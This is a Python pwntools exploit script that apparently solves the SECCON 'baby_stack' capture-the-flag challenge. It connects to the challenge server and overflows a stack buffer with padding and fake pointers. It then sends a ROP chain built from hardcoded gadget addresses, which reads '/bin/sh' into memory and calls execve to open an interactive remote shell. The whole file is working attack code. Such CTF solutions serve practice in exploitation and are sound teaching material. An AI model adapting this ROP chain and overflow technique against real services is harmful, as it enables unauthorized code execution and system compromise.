from pwn import *
import time

#r = process('./baby_stack')
r = remote('baby_stack.pwn.seccon.jp', 15285)
context.arch = 'amd64'

# config
syscall = 0x0000000000456889# : syscall ; ret
prax = 0x00000000004016ea# : pop rax ; ret
prdi = 0x0000000000470931# : pop rdi ; or byte ptr [rax + 0x39], cl ; ret
prsi = 0x000000000046defd# : pop rsi ; ret
prdx = 0x000000000046ec93# : pop rdx ; adc byte ptr [rax - 1], cl ; ret
buf = 0x00000000005a0300
def packAll(rop):
    return flat([p64(x) for x in rop])

#padding
r.sendline('C')

rop = []
rop += [prax, 0x00000000005a0270]
rop += [prdi, 0]
rop += [prsi, buf]
rop += [prdx, 0x10]
rop += [prax, 0]
rop += [syscall]
rop += [prax, 0x00000000005a0270]
rop += [prdi, buf]
rop += [prsi, 0]
rop += [prdx, 0]
rop += [prax, 0x3b]
rop += [syscall]

r.sendline('A'*0x68+p64(0x00000000005220a0)+p64(0)+'A'*80+p64(0x00000000005220a0)+p64(0x20)+'A'*192+packAll(rop))
time.sleep(0.5)
r.sendline('/bin/sh\x00')

r.clean()
r.interactive()
